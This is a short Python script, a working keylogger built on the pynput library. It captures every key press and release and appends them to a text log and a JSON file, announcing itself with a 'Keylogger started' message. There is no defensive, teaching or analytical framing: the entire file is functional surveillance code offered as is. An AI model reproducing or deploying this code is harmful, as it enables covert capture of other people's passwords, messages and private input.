from pynput import keyboard
import json

# ---------------- Variables ----------------
key_list = []
key_strokes = ""

# ---------------- File Functions ----------------
def update_text_file(key):
    with open('log.txt', 'a') as file:
        file.write(key)

def update_json_file():
    with open('logs.json', 'w') as file:
        json.dump(key_list, file, indent=4)

# ---------------- Key Events ----------------
def on_press(key):
    key_list.append({'Pressed': str(key)})
    update_json_file()

def on_release(key):
    key_list.append({'Released': str(key)})
    update_json_file()
    update_text_file(str(key) + " ")

# ---------------- Start Keylogger ----------------
print("[+] Keylogger started...")
print("[!] Press CTRL + C to stop")

with keyboard.Listener(
    on_press=on_press,
    on_release=on_release
) as listener:
    listener.join()
